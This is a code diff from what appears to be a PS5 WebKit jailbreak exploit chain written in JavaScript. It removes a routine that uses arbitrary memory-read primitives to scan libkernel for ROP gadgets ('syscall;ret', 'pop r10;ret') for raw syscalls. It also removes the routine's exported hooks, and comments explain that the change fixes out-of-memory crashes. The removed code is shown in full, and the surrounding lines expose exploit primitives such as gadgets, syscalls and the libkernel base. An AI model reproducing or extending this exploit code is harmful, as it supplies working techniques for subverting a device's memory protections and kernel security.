@@ -271,62 +271,6 @@ async function prepare(p) {
         p.write1(waddr, 0x0);
     }
 
-    // [raw syscall] Some syscalls have NO libkernel C stub (e.g. 727/0x2D7
-    // GET_AIO_DEBUG_REQUEST_INFO). To call them we scan libkernel_web .text
-    // for `syscall;ret` (0f 05 c3) and `pop r10;ret` (41 5a c3).
-    //
-    // WHY LIBKERNEL, NOT WEBKIT:
-    //   WebKit scan (old): 8-16 MB, byte-stepped -> 8-16M add32() calls
-    //   -> 8-16M int64 temp objects -> GC pressure -> OOM on PS5.
-    //   libkernel scan: 256 KB max, `syscall;ret` appears in the FIRST 64 KB
-    //   (every syscall stub ends with it, hundreds of occurrences).
-    //   262K iterations vs 16M = 64x fewer objects, no OOM risk.
-    //   PSAITO bridge.js (0aa7b50) confirmed: scan libkernel, not WebKit.
-    let rawSyscall = false;
-    function scanLkPat(pat) {
-        if (pat.length !== 3) return null;
-        const target = (pat[0] & 0xff) | ((pat[1] & 0xff) << 8) | ((pat[2] & 0xff) << 16);
-        // First 256 KB of libkernel covers ALL syscall stubs — `syscall;ret`
-        // appears within the first 64 KB. Extend to 1 MB only as a fallback.
-        const PASSES = [0x40000, 0x100000]; // 256 KB then 1 MB
-        let from = 0;
-        for (let pass = 0; pass < PASSES.length; pass++) {
-            const to = PASSES[pass];
-            for (let off = from; off + 3 <= to; off++) {
-                if ((p.read4(libKernelBase.add32(off)) & 0xFFFFFF) === target)
-                    return libKernelBase.add32(off);
-            }
-            from = to;
-        }
-        return null;
-    }
-    // Lazy: run the scan only when the first stub-less syscall is needed
-    // (Run Exploit / Stage 2), NOT during prepare() at WebKit-finish where the
-    // heap is tight — any extra work there risks the "not enough free memory"
-    // dialog. Returns true when the `syscall;ret` gadget was found.
-    let rawScanned = false;
-    function scanRawGadgets() {
-        if (rawScanned) return rawSyscall;
-        rawScanned = true;
-        try {
-            if (/[?&]noraw=1/.test(location.search || "")) {
-                jbmark("WK-RAW-SKIP", "noraw=1");
-                return false;
-            }
-            const gSyscall = scanLkPat([0x0f, 0x05, 0xc3]);
-            const gPopR10 = scanLkPat([0x41, 0x5a, 0xc3]);
-            if (gSyscall !== null) gadgets["syscall"] = gSyscall;
-            if (gPopR10 !== null) gadgets["pop r10"] = gPopR10;
-            rawSyscall = (gSyscall !== null);
-            jbmark(rawSyscall ? "WK-RAW-SYSCALL" : "WK-NO-RAW-SYSCALL",
-                "syscall=" + (gSyscall === null ? "none" : "0x" + gSyscall.toString())
-                + " popr10=" + (gPopR10 === null ? "none" : "0x" + gPopR10.toString()));
-        } catch (e) {
-            jbmark("WK-RAW-THREW", String(e && e.message || e).slice(0, 40));
-        }
-        return rawSyscall;
-    }
-
     async function wait_for_worker() {
 
         return new Promise((resolve) => {
@@ -422,8 +366,10 @@ async function prepare(p) {
         libKernelBase: libKernelBase,
         nogc: nogc,
         syscalls: syscalls,
-        scanRawGadgets: scanRawGadgets,
-        get rawSyscall() { return rawSyscall; },
+        // [727-removed] scanRawGadgets / rawSyscall deleted with the 727 leak:
+        // the raw-path gadget scan churned ~500K int64 objects in one sync
+        // loop at Run-click — that was the "not enough free memory" crash.
+        // Every syscall the chain uses has a libkernel stub now.
         gadgets: gadgets
     };
 
